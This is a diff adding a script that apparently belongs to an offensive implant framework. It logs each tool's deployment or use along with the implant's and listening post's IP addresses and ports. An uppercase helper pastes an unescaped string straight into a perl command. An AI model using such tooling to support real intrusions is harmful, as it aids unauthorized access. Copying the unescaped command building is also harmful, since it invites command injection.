@@ -1,0 +1,105 @@
+#-------------------------------------------------------------------------------
+# _RecordToolUse
+#    Records the use of a tool
+#-------------------------------------------------------------------------------
+@include "_FileExists.epm";
+@include "_GetDirectory.epm";
+
+Sub _RecordToolUse(IN STRING $name, IN STRING $version)
+{
+
+    if ($name == "") {
+	echo "* No name given -- cannot record tool use";
+	return false;
+    }
+
+    string $usedToolDir = "UsedTools";
+    string $logDir;
+    ifnot (_GetLpLogsDirectory($logDir)) {
+	echo "* Failed to get logs directory -- cannot record tool use";
+	return false;
+    }
+
+    # make sure the directory exists
+    
+		@record on;
+		`local mkdir "$logDir\\$usedToolDir"`;
+		@record off;
+   
+    
+    # write the file
+    string $lines;
+    $lines[0] = "--";
+    $lines[1] = "NAME=$name";
+    $lines[2] = "VERSION=$version";
+    ifnot (WriteFile("$logDir\\$usedToolDir\\$name.txt", true, $lines)) {
+	echo "* Failed to write lines to file -- cannot record tool use";
+	return false;
+    }
+
+    return true;
+}
+
+# usage = string(ACCESSED|DEPLOYED|EXERCISED|CHECKED|QUEUED|DELETED)
+# status = string(Successful|Unsuccessful)
+Sub _RecordToolUse(IN string $tool, IN string $version, IN string $usage, IN string $status, IN string $comment)
+{
+	string $lines;
+	int $i=0;
+	
+	$lines[$i] = "--"; $i++;
+
+	uc($tool, $tool);
+	$lines[$i] = "Tool:$tool"; $i++;
+	$lines[$i] = "Version:$version"; $i++;
+
+	uc($usage, $usage);
+	$lines[$i] = "Usage:$usage"; $i++;
+	$lines[$i] =  "Tool Status:$status"; $i++;
+
+	ifnot($comment == "") { $lines[$i] = "Tool Comments: $comment";	$i++; }
+
+	@record on;
+	`getnetaddr`;
+	@record off;
+
+	string $remote_address = GetCmdData("remote_address");
+	int $remote_port = GetCmdData("remote_port");
+	string $remote_peer_address = GetCmdData("remote_peer_address");
+	int $remote_peer_port = GetCmdData("remote_peer_port");
+	#string $local_address = GetCmdData("local_address");
+	#int $local_port = GetCmdData("local_port");
+	
+	$lines[$i] = "Implant IP:$remote_address"; $i++;
+	$lines[$i] = "Implant port:$remote_port"; $i++;
+	$lines[$i] = "LP IP:$remote_peer_address"; $i++;
+	$lines[$i] = "LP port:$remote_peer_port"; $i++;
+
+	@record on;
+	`getdirectory -logs`;
+	@record off;
+
+	string $path = GetCmdData("dir");
+
+	ifnot(writefile("$path\\UsedTools\\used_$tool.txt", true, $lines))
+	{
+		echo "Failed to write to file: $path\\UsedTools\\used_$tool.txt";
+	}
+}
+
+# overloaded subroutine
+# supplies a blank comment field if none is supplied
+Sub _RecordToolUse(IN string $tool, IN string $version, IN string $usage, IN string $status)
+{
+	_RecordToolUse($tool, $version, $usage, $status, "");
+}
+
+Sub uc(IN string $string, OUT string $ret)
+{
+	@record on;
+	`local run -command "perl -e \\"print uc('$string')\\"" -redirect`;
+	@record off;
+
+	$ret = GetCmdData("output");
+}
+
